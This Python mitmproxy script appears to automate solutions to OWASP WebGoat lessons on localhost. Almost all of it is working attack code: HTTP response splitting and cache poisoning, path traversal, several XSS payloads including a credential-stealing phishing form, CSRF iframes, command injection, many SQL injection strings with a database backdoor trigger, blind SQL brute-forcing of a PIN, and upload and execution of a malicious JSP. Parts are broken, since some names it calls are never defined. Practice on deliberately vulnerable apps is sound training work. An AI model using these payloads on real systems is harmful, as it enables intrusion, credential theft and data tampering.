#!/usr/bin/env python
# -*- coding:utf-8 -*-
import mitmproxy
from urllib.parse import quote,unquote,urlencode
import utils.tools as tools
import utils.mitmSql as mitmSql
import utils.concurrency as concurrency
import re
from bs4 import BeautifulSoup,Comment
import lxml
import json
import utils.concurrency as concurrency

http_split_posion_exploit = [
    " \r\nContent-Length: 0\r\n",
    "\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 35\r\n<script>alert(\"攻击成功!\")</script>",
    "\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nLast-Modified: Tue, 28 Jan 2030 22:29:04 GMT\r\nContent-Length: 35\r\n<script>alert(\"攻击成功!\")</script>"   
]
access_control_flaws_exploit = [
 "../../../../conf/tomcat-users.xml",#Bypass a Path Based Access Control Scheme
 "DeleteProfile",#Bypass Business Layer Access Control
 "101"#Breaking Data Layer Access Control
]
ajax_security_exploit ={
    "dom_xss_one":"<IMG SRC=\"images/logos/owasp.jpg\"/>",
    "dom_xss_two":"<img src=x onerror=;;alert('XSS') />",
    "dom_xss_three":"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    "dom_xss_four":"Please enter your password:<BR><input type = \"password\" name=\"pass\"/><button onClick=\"javascript:alert('I have your password: ' + pass.value);\">Submit</button>",
    "xml_injection":'''
                    <root>
                    <reward>WebGoat t-shirt 20 Pts</reward>
                    <reward>WebGoat Secure Kettle 50 Pts</reward>
                    <reward>WebGoat Mug 30 Pts</reward>
                    <reward>WebGoat Core Duo Laptop 2000 Pts</reward>
                    <reward>WebGoat Hawaii Cruise 3000 Pts</reward>
                    </root>
                    '''
}
xss_exploit = {
    'phishing':'''
    </form>
    <script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + "";
     alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} 
     </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br>
     <input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br>
     <input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
    ''',
    'reflected_XSS':'''
    <script>alert("success!");</script>
    ''',
    'stored_xss':'''<script>alert("success!");</script>''',
    'csrf':'''
    <img src="http://localhost/WebGoat/attack?Screen=33&menu=900&amp;transferFunds=5000" width="1" height="1">
    ''',
    'csrf_bypass':'''
    <iframe
	src="http://localhost/WebGoat/attack?Screen=32&menu=900&transferFunds=400"
	id="myFrame" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300"
	onload="document.getElementById('frame2').src='http://localhost/WebGoat/attack?Screen=32&menu=900&transferFunds=CONFIRM';">
    </iframe>
	<iframe
	id="frame2" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300">
    </iframe>
    ''',
    'xst':'''
    <script type="text/javascript">
    if ( navigator.appName.indexOf("Microsoft") !=-1) 
    {
    var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    xmlHttp.open("TRACE", "./", false); 
    xmlHttp.send();
    str1=xmlHttp.responseText; 
    while (str1.indexOf("\n") > -1) str1 = str1.replace("\n","<br>"); 
    document.write(str1);
    }
    </script>
    '''
}
command_Injection = {
    'win':'''
    " & netstat -an & arp -a & dir
    ''',
    'linux':'''
    && arp -a
    '''
}
number_sql_injection = {
    'test_sucess':''' and 1=1''',
    'test_error':''' and 1=2''',
    'guess_fields':''' order by ''',#猜测字段数，后接字数字
    'guess_fields_seat':'''
     union select 
    ''',#猜测字段的位数，后接字段的位置，例如：如果字段数是3，则接 1,2,3
    'guess_db_name':'''
     and 1=2 union select 1,database(),
    ''',#猜测数据库名，如果字段数是3，则接 3
    'guess_table_name':'''
     and 1=2 union select 1,group_concat(table_name),
    ''',#猜表名，database(),如果字段数是4 则接 3,4 from information_schema.tables where table_schema=database()
    'guess_column_name':'''
    and 1=2 union select 1,group_concat(column_name),
    ''',#猜列名，如果字段是3 则接3 from information_schema.columns where table_name='表名'
    'guess_datas':'''
    union select 1,group_concat(id,title,content)，
    ''',#猜数据，如果字段是3 则接 3 from 表名
    'all':'''
     or 1=1
    ''' #显示全部数据
}
lab_sql_injection = {
    'stage3':''' or 1=1 order by salary desc limit 1 '''
}
string_sql_injection = {
    'all':'''' or '1'='1'''
}
modify_data_sql_injection = {
    'modify':''''; UPDATE salaries SET salary=1000 WHERE userid='jsmith'''
}
def my_tools_url_encode(param):
    urlEncode = quote(param)
    return urlEncode
def my_tools_filter_xml(flow):
    for k in flow.response.headers.keys():
        if flow.response.headers.get(k) == "text/xml":
            return flow
def my_tools_filter_json(flow):
    try:
        json.loads(flow.response.text)
    except Exception as e:
        return False
    return True
#HTTP拆分
def my_exploit_http_split(flow):
    #修改参数
    if flow.request.urlencoded_form:
        #截断参数构造
        truncation = my_tools_url_encode(http_split_posion_exploit[0])
        #第二次污染请求构造
        attack = my_tools_url_encode(http_split_posion_exploit[1])
        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + truncation
        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + attack
#HTTP拆分_缓存投毒
def my_exploit_cache_poisoning(flow):
    if flow.request.urlencoded_form:
        #截断参数构造
        truncation = my_tools_url_encode(http_split_posion_exploit[0])
        #第二次缓存投毒 添加last-modify参数
        attack = my_tools_url_encode(http_split_posion_exploit[2])
        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + truncation
        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + attack

def my_exploit_http_split_simulation_response(flow):
    resp_content = flow.response.get_text()
    simulation_content = "<script>alert(\"攻击成功!\")</script>"
    if resp_content.find("Stage 1: HTTP Splitting")>0 and  resp_content.find("Good Job")>0 :
        resp_lists = resp_content.split("</body>")
        resp_content = resp_lists[0]+simulation_content+resp_lists[1]
        flow.response.set_text(resp_content)
#绕过基于路径的访问控制
def my_exploit_Bypass_a_Path_Based_Access_Control(flow):
    if flow.request.urlencoded_form:
        flow.request.urlencoded_form['File'] = access_control_flaws_exploit[0]
#绕过表示层访问控制
def my_exploit_Bypass_Presentational_Layer(flow):
    if flow.request.urlencoded_form["action"] != "Login":
        flow.request.urlencoded_form['action'] = access_control_flaws_exploit[1]
#破坏数据层访问控制
def my_exploit_Breaking_Data_Layer(flow):
    if flow.request.urlencoded_form["action"] != "Login":
        flow.request.urlencoded_form['employee_id'] = access_control_flaws_exploit[2]
#利用访问控制规则
def my_exploit_Using_an_Access_Control_Matrix(params):
    url = "http://localhost/WebGoat/attack?"+ params
    params = {
    "User":"",
    "Resource":"",
    "SUBMIT":"Check Access"
    }
    cookies = {
        "name":"JSESSIONID",
        "value":"3C5844601B61289CBBDE83F302598D76"
    }
    auth = ('guest','guest')
    judge = "Congratulations. You have successfully completed this lesson."
    changeUser = [
        'Moe',
        'Larry',
        'Curly',
        'Shemp'
    ]
    selectResource=[
        'Public Share',
        'Time Card Entry',
        'Performance Review',
        'Time Card Approval',
        'Site Manager',
        'Account Manager'
    ]
    mark = 0
    condition = [changeUser,selectResource]
    conditionComb = tools.tools_compose(*condition)
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    #http_send.set_cookie(cookies)
    #http_send.set_auth(auth)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    for user,account in conditionComb:
        params["User"] =user
        params["Resource"] = account
        http_send.set_params(params)
        r = http_send.send_post()
        if r.text.find(judge) > 0:
            print("可越权访问的用户:"+params["User"])
            print("管理员账户:"+params['Resource'])
            mark = 1
            break
    if mark == 0:
        return {}
    else:
        return params
#基于DOM的跨站点脚本
def my_exploit_DOM_Based_xss(flow):
    params = flow.request.urlencoded_form['person']
    if params == "stage1":
        flow.request.urlencoded_form['person'] = ajax_security_exploit["dom_xss_one"]
    elif params == "stage2":
        flow.request.urlencoded_form['person'] = ajax_security_exploit['dom_xss_two']
    elif params == "stage3":
        flow.request.urlencoded_form['person'] = ajax_security_exploit['dom_xss_three']
    elif params == "stage4":
        flow.request.urlencoded_form['person'] = ajax_security_exploit['dom_xss_four']
    else:
        pass
#DOM注入
def my_exploit_DOM_Injection(flow):
    re_dis = re.compile('disabled=\"\"',re.I)
    resp_content = flow.response.get_text()
    if resp_content.find("disabled") > 0:
        replace_content = re_dis.sub('',resp_content)
        flow.response.set_text(replace_content)
#客户端过滤(页面过滤)
def my_exploit_Client_Side_Filtering_html(flow):
    resp_content = flow.response.get_text()
    bsoup = BeautifulSoup(resp_content,"lxml")
    tables = bsoup.find_all('table')
    t_text = []
    for t in tables:
        if t.get("id") == "hiddenEmployeeRecords":
            trs = t.find_all("tr")
            for tr in trs:
                for td in tr.find_all('td')[1:5]:
                    t_text.append(td.getText())
    return t_text
def my_exploit_Client_Side_Filtering(flow):
    params = flow.request.urlencoded_form
    if 'answer' in params.keys():
        flow.request.urlencoded_form['answer'] = 450000
#XML注入
def my_exploit_xml_injection_response(flow):
    if my_tools_filter_xml(flow):
        if flow.response.text.find("t-shirt") > 0:
            flow.response.set_text(ajax_security_exploit['xml_injection'])
#json注入
def my_exploit_json_injection_response(flow):
    if my_tools_filter_json(flow):
        json_content = json.loads(flow.response.text)
        if "flights" in json_content:
            for i in range(len(json_content['flights'])):
                if json_content['flights'][i]["price"] == "$600":
                    json_content['flights'][i]["price"] = "$100"
        flow.response.set_text(json.dumps(json_content))
#危险的eval函数
def my_exploit_Dangerous_Use_of_Eval(flow):
    exploit = "321\');alert(document.cookie);(\'"
    params = flow.request.urlencoded_form
    if 'field1' in params.keys():
        flow.request.urlencoded_form['field1'] = exploit
#多级登录1课程2
def my_exploit_Multi_Level_Login_one_stage_2(flow):
    params = flow.request.urlencoded_form
    if 'hidden_tan' in params.keys():
        flow.request.urlencoded_form['hidden_tan'] = 1
#多级登录2课程2
def my_exploit_Multi_Level_Login_two_stage_2(flow):
    params = flow.request.urlencoded_form
    if 'hidden_user' in params.keys():
        flow.request.urlencoded_form['hidden_user'] = 'Jane'
#缓冲区溢出
def my_exploit_Buffer_Overflows(flow):
    params = flow.request.urlencoded_form
    if 'room_no' in params.keys():
        flow.request.urlencoded_form['room_no'] = 'a'*4097
#并发缺陷   
def concurrency_func(username):
    print(username)
    url = "http://localhost/WebGoat/attack?Screen=26&menu=800"
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    params = {}
    params['username'] = username
    params['SUBMIT'] = 'Submit'
    http_send.set_params(params)
    r = http_send.send_post()
    #print(r.text)
    #Account information for user: dave
    if r.text.find('Account information for user: dave') > 0:
        print("dave!")
    elif r.text.find('Account information for user: jeff') > 0:
        print("jeff!")
def my_exploit_concurrenc():
    t = concurrency.Concurrency(concurrency_func,0,2,['jeff','dave'])
    t.run()
    return "测试成功!"

def my_exploit_phishing_with_xss(flow):
    flow.request.urlencoded_form['Username'] = xss_exploit["phishing"]


def my_exploit_Stored_XSS(flow):
    params = flow.request.urlencoded_form
    if 'address1' in params.keys():
        flow.request.urlencoded_form['address1'] = xss_exploit["stored_xss"]

def my_exploit_reflected_xss(flow):
    params = flow.request.urlencoded_form
    if 'search_name' in params.keys():
        flow.request.urlencoded_form['search_name']=xss_exploit['reflected_XSS']

def my_exploit_csrf(flow):
    params = flow.request.urlencoded_form
    if 'message' in params.keys():
        flow.request.urlencoded_form['message'] = xss_exploit['csrf']

def my_exploit_csrf_bypass(flow):
    params = flow.request.urlencoded_form
    if 'message' in params.keys():
        flow.request.urlencoded_form['message'] = xss_exploit['csrf_bypass']

def my_exploit_xst(flow):
    params = flow.request.urlencoded_form
    if 'field1' in params.keys():
        flow.request.urlencoded_form['field1'] = xss_exploit['xst']

def my_exploit_improper_error_handling(flow):
    params = flow.request.urlencoded_form
    if 'Password' in params.keys():
        del flow.request.urlencoded_form['Password']

def my_exploit_command_injection(flow):
    params = flow.request.urlencoded_form
    if 'HelpFile' in params.keys():
        flow.request.urlencoded_form['HelpFile'] = command_Injection['win']

def my_exploit_number_sql_injection(flow):
    params = flow.request.urlencoded_form
    if 'station' in params.keys():
        station = flow.request.urlencoded_form['station']
        flow.request.urlencoded_form['station'] = station + number_sql_injection['all']

def my_exploit_log_spoofing(flow):
    params = flow.request.urlencoded_form
    if 'username' in params.keys():
        username = flow.request.urlencoded_form['username']
        flow.request.urlencoded_form['username'] = username + log_spoofing['crlf']

def my_exploit_xpath_injection(flow):
    params = flow.request.urlencoded_form
    if 'Username' in params.keys():
        username = flow.request.urlencoded_form['Username']
        flow.request.urlencoded_form['Username'] = username + xpath_injection['all']

def my_exploit_string_sql_injection(flow):
    params = flow.request.urlencoded_form
    if 'password' in params.keys():
        password = flow.request.urlencoded_form['password']
        flow.request.urlencoded_form['password'] = password + string_sql_injection['all']

def my_exploit_lab_number_sql_injection(flow):
    params = flow.request.urlencoded_form
    if 'action' in params.keys():
        if params['action'] == 'ViewProfile':
            employId = flow.request.urlencoded_form['employee_id']
            flow.request.urlencoded_form['employee_id'] = employId + lab_sql_injection['stage3']

def my_exploit_modify_data_sql_injection(flow):
    params = flow.request.urlencoded_form
    if 'userid' in params.keys():
        userid = flow.request.urlencoded_form['userid']
        flow.request.urlencoded_form['userid'] = userid + modify_data_sql_injection['modify']

def my_exploit_database_backdoor(flow):
    params = flow.request.urlencoded_form
    exploit = "; update employee set salary=10000"
    exploit_backdoor = ''';CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com' WHERE userid = NEW.userid'''
    if 'username' in params.keys():
        username = params['username']            
        if str(params['username']) == "102":
            flow.request.urlencoded_form['username'] = username + exploit_backdoor
        else:
            flow.request.urlencoded_form['username'] = username + exploit
#拒绝服务攻击
def my_exploit_Denial_of_Service(flow):
    params = flow.request.urlencoded_form
    if 'Password' in params.keys():
        flow.request.urlencoded_form['Password'] = params['Password'] + string_sql_injection['all']
#绕过html字段限制
def my_exploit_Bypass_HTML_Field_Restrictions(flow):
    params = flow.request.urlencoded_form
    #select=foo&radio=foo&checkbox=on&shortinput=12345&SUBMIT=Submit
    if 'select' in params.keys() and \
        'radio' in params.keys() and \
        'checkbox' in params.keys():
        flow.request.urlencoded_form['select'] = "test"
        flow.request.urlencoded_form['radio'] = "test"
        flow.request.urlencoded_form['checkbox'] = "test"
        flow.request.urlencoded_form['disabledinput'] = "test"
        flow.request.urlencoded_form['shortinput'] = "testtesttest"
        flow.request.urlencoded_form['SUBMIT'] = "test"
#利用隐藏字段
def my_exploit_Exploit_Hidden_Fields(flow):
    params = flow.request.urlencoded_form
    if 'Price' in params.keys():
        flow.request.urlencoded_form['Price'] = 1
#利用未校验的电子邮件
def my_exploit_Exploit_Unchecked_Email(flow):
    params = flow.request.urlencoded_form
    if 'msg' in params.keys():
        flow.request.urlencoded_form['msg'] = "<script>alert(\"test\")</script>"
        if flow.request.urlencoded_form['subject'] == 'lesson2':
            flow.request.urlencoded_form['to'] = "myfriend@test.com"
#绕过客户端脚本验证
def my_exploit_Bypass_Client_Side_JavaScript_Validation(flow):
    params = flow.request.urlencoded_form
    if 'field1' in params.keys() and 'field2' in params.keys():
        flow.request.urlencoded_form['field1'] = "ABC"
        flow.request.urlencoded_form['field2'] = "12345!!"
        flow.request.urlencoded_form['field3'] = "1w2er3!@#wwe"
        flow.request.urlencoded_form['field4'] = "!@#wwe"
        flow.request.urlencoded_form['field5'] = "!@#wwe"
        flow.request.urlencoded_form['field6'] = "!@#wwe"
        flow.request.urlencoded_form['field7'] = "!@#wwe"

def my_api_find_resp_cookies(flow):
    if 'Set-Cookie' in flow.response.headers.keys():
        auth_cookie =flow.response.headers['Set-Cookie']
        return auth_cookie
#伪造身份验证cookie
def my_exploit_Spoof_an_Authentication_Cookie(flow):
    params = flow.request.urlencoded_form
    header = flow.request.headers
    auth_cookie = my_api_find_resp_cookies(flow)
    if 'Username' in params.keys():
        if params['Username'] == 'alice':
            if self.auth_cookie:
                if 'Cookie' in header.keys():
                    number = filter(str.isdigit,auth_cookie)
                    str_number = ''.join(number)
                    flow.request.headers['Cookie'] = header['Cookie'] + ";AuthCookie=" + str_number+"fdjmb"
#数字型sql盲注
def my_exploit_Blind_Numeric_SQL_Injection(params):
    '''
    sql盲注，基于返回值的正确或者错误，定位正确数据
    '''
    url = "http://localhost/WebGoat/attack?"+ params
    params = {
        'account_number':'',
        'SUBMIT':'Go'
    }
    exploit = '''101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') = '''
    exploit_supply = " )"
    judge = "Account number is valid"
    result = ""
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    for n in range(2000,2500):
        params['account_number'] = exploit+str(n)+exploit_supply
        http_send.set_params(params)
        r = http_send.send_post()
        if r.text.find(judge) > 0:
            #print("正确的pin:"+str(n))
            result = "正确的pin值:"+str(n)
            return result
    return result

def my_exploit_Blind_String_SQL_Injection(params):
    url = "http://localhost/WebGoat/attack?" + params  
    exploit = '''101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'),  '''
    exploit_supply_b = ", 1) ="
    exploit_supply_l = "'"
    exploit_supply_r = "')"
    result = []
    judge = "Account number is valid"
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    params = {
        'account_number':'',
        'SUBMIT':'Go'
    }
    for i in range(4):
        for n in string.ascii_letters:
            params['account_number'] = exploit+str(i+1)+exploit_supply_b+exploit_supply_l+n+exploit_supply_r
            http_send.set_params(params)
            r = http_send.send_post()
            if r.text.find(judge)>0:
                result.append(n)
    if result:
        return ''.join(result)
    else:
        return ''
#恶意文件执行
def my_exploit_malicious_execution(params):
    url = "http://localhost/WebGoat/attack?" + params
    exec_url = "http://localhost/WebGoat/uploads/malicious.jsp"
    exec_headers = {}
    exec_file = "./utils/execfile/malicious.jsp"
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    m = MultipartEncoder(
        fields = {
            "file":('malicious.jsp',open(exec_file,'rb'),'application/octet-stream'),
            'SUBMIT':'Start Upload'
        }
    )
    headers['Content-Type'] = m.content_type
    r = requests.post(url,data=m,headers=headers)
    exec_headers['User-Agent'] = headers['User-Agent']
    exec_headers['Cookie'] = headers['Cookie']
    exec_headers['Authorization'] = headers['Authorization']
    r = requests.get(exec_url,headers=exec_headers)
    return r